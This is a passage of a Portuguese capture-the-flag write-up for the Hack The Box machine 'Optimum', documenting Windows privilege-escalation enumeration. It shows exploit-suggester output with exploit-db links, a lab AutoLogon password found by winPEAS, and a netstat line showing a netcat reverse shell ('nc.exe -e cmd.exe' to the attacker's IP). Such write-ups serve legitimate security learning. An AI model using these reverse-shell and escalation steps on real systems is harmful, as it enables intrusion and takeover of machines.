Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40765/

Date: 20161213
CVE: CVE-2016-7224
KB: KB3197874
Title: VHD Driver Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Virtual Hard Drive
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40765/

Date: 20161213
CVE: CVE-2016-7224
KB: KB3197873
Title: VHD Driver Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Virtual Hard Drive
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40765/

Date: 20160809
CVE: CVE-2016-3237
KB: KB3192392
Title: Security Update for Windows Authentication Methods
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40409/

Date: 20190108
CVE: CVE-2019-0555
KB: KB4487028
Title: Microsoft XmlDocument Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft XML
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46185/

Date: 20190108
CVE: CVE-2019-0555
KB: KB4487028
Title: Microsoft XmlDocument Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft XML
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46185/

Date: 20190108
CVE: CVE-2019-0555
KB: KB4487028
Title: Microsoft XmlDocument Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft XML
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46185/

Date: 20190108
CVE: CVE-2019-0555
KB: KB4487028
Title: Microsoft XmlDocument Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft XML
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46185/

Date: 20190108
CVE: CVE-2019-0552
KB: KB4480964
Title: Windows COM Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows COM
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46162/

Date: 20190108
CVE: CVE-2019-0552
KB: KB4480964
Title: Windows COM Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows COM
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46162/

Date: 20190108
CVE: CVE-2019-0552
KB: KB4480964
Title: Windows COM Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows COM
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46162/

Date: 20190108
CVE: CVE-2019-0552
KB: KB4480964
Title: Windows COM Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows COM
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46162/

Date: 20190409
CVE: CVE-2019-0836
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46718/

Date: 20190409
CVE: CVE-2019-0836
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46718/

Date: 20190409
CVE: CVE-2019-0836
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46718/

Date: 20190409
CVE: CVE-2019-0836
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46718/

Date: 20190108
CVE: CVE-2019-0543
KB: KB4480964
Title: Microsoft Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46156/

Date: 20190108
CVE: CVE-2019-0543
KB: KB4480964
Title: Microsoft Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46156/

Date: 20190108
CVE: CVE-2019-0543
KB: KB4480964
Title: Microsoft Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46156/

Date: 20190108
CVE: CVE-2019-0543
KB: KB4480964
Title: Microsoft Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46156/

[+] Missing patches: 27
    - KB4493467: patches 24 vulnerabilities
    - KB4480964: patches 12 vulnerabilities
    - KB3192392: patches 10 vulnerabilities
    - KB3197873: patches 6 vulnerabilities
    - KB3082089: patches 6 vulnerabilities
    - KB3084135: patches 6 vulnerabilities
    - KB4056898: patches 5 vulnerabilities
    - KB4487028: patches 4 vulnerabilities
    - KB3164035: patches 4 vulnerabilities
    - KB3156017: patches 4 vulnerabilities
    - KB3175024: patches 4 vulnerabilities
    - KB4457143: patches 3 vulnerabilities
    - KB4019213: patches 3 vulnerabilities
    - KB3019978: patches 2 vulnerabilities
    - KB3023266: patches 2 vulnerabilities
    - KB4015547: patches 2 vulnerabilities
    - KB3197874: patches 2 vulnerabilities
    - KB3021674: patches 2 vulnerabilities
    - KB4462941: patches 2 vulnerabilities
    - KB3067505: patches 2 vulnerabilities
    - KB3045171: patches 2 vulnerabilities
    - KB4467703: patches 1 vulnerability
    - KB3139914: patches 1 vulnerability
    - KB3161561: patches 1 vulnerability
    - KB4103715: patches 1 vulnerability
    - KB3159398: patches 1 vulnerability
    - KB4012213: patches 1 vulnerability
[+] KB with the most recent release date
    - ID: KB4493467
    - Release date: 20190409

[+] Done. Displaying 113 of the 4051 vulnerabilities found.
```

Resolvi enumerar um pouco mais, dessa vez usanso o winPEAS.

Tranferir usando o SMBSERVER

Encontramos a senha de um usuario, vou tentar executar comando usando o administrator com a senha encontrada do usuario.

```
[+] Looking for AutoLogon credentials(T1012)                                                                                                                             
    Some AutoLogon credentials were found!!                                                                                                                                
    DefaultUserName               :  kostas                                                                                                                                
    DefaultPassword               :  kdeEjDowkS*    
```

Encontrei mais informacoes interessantes

```
=== Active TCP Network Connections ===    
                                          
  Local Address          Foreign Address        State      PID   Service         ProcessName
  0.0.0.0:80             0.0.0.0:0              LISTEN     2620                  "C:\Users\kostas\Desktop\hfs.exe" 
  0.0.0.0:135            0.0.0.0:0              LISTEN     576   RpcSs           svchost.exe
  0.0.0.0:445            0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:5985           0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:47001          0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:49152          0.0.0.0:0              LISTEN     384                   wininit.exe
  0.0.0.0:49153          0.0.0.0:0              LISTEN     676   EventLog        svchost.exe
  0.0.0.0:49154          0.0.0.0:0              LISTEN     728   Schedule        svchost.exe
  0.0.0.0:49155          0.0.0.0:0              LISTEN     528   Spooler         spoolsv.exe
  0.0.0.0:49156          0.0.0.0:0              LISTEN     480                   services.exe
  0.0.0.0:49157          0.0.0.0:0              LISTEN     488                   lsass.exe
  10.10.10.8:139         0.0.0.0:0              LISTEN     4                     System                                                                                    
  10.10.10.8:49174       10.10.14.36:443        CLOSE_WAIT 2380                  
  10.10.10.8:49179       10.10.14.36:443        ESTAB      2184                  "C:\Users\Public\nc.exe" -e cmd.exe 10.10.14.36 443

```
    
```
=== Registry Autoruns ===

  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
```
Booom, volteiii depois de ter tentado mais outras formas por exemplo **Port Forward** com as portas que tinha encontrado localmente e tentativas de login nesses mesmos servicos tbmm, nao tive muita sorte e muito menos consegui proceguir....

De volta ao ponto inicial exploit de kernel , divido ter encontrado mais de 50 vulns o wesng nao diz qual o MS*-** APENAS o numero referente ao CVE e isso eu senti difificuldades para procurar exploits mais rapidamentes..

Mas, existe uma outra alternativa tambem funcional e com um output mais maneiro eu achei... 

***reference*** https://github.com/AonCyberLabs/Windows-Exploit-Suggester

`python windows-exploit-suggester.py --database 2020-06-23-mssb.xls --systeminfo /root/HTB-Windows/optimum/systeminfo.txt `

![5.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-optimum/5.jpg)

Ok, preciso apenas de exploits local.. entao basta passar a opcao **-l**

![6.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-optimum/6.jpg)

```
 initiating winsploit version 3.3...
 database file detected as xls or xlsx based on extension
 attempting to read from the systeminfo input file
 systeminfo input file read successfully (ISO-8859-1)
 querying database file for potential vulnerabilities
 comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
 there are now 246 remaining vulns
 searching for local exploits only
 [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
 windows version identified as 'Windows 2012 R2 64-bit'
 
 MS16-075: Security Update for Windows SMB Server (3164038) - Important
   https://github.com/foxglovesec/RottenPotato
   https://github.com/Kevin-Robertson/Tater
   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
 
 MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
 
 MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
 
 MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
 
 MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
 
 done
 ```
